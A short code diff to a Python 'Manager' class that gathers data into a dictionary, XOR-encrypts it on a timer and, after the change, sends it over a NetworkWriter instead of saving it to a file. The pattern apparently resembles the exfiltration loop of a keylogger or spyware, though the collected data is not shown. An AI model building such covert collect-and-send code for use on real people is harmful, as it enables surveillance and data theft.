@@ -17,9 +17,8 @@ class Manager:
         writing data to a dictionary and file, and encrypting it periodically."""
         minute = 60
         send_encryption = 5
-        reset = 15
         dw = DictWriter()
-        fw = FileWriter()
+        # fw = FileWriter()
         nw = NetworkWriter()
         count = 0
         while True:
@@ -42,11 +41,9 @@ class Manager:
                     dict_encrypt = XorEncryptor().encrypt(get_dict)
                     # print(dict_encrypt)
                     # Write the encrypted dictionary to the file
-                    print(str(get_dict))
-                    fw.write(dict_encrypt)
-                if count >= reset:
-                    nw.write("aaa")
-                    count = 0
+                    # fw.write(dict_encrypt)
+                    nw.write(dict_encrypt)
+                count = 0
 
 
 
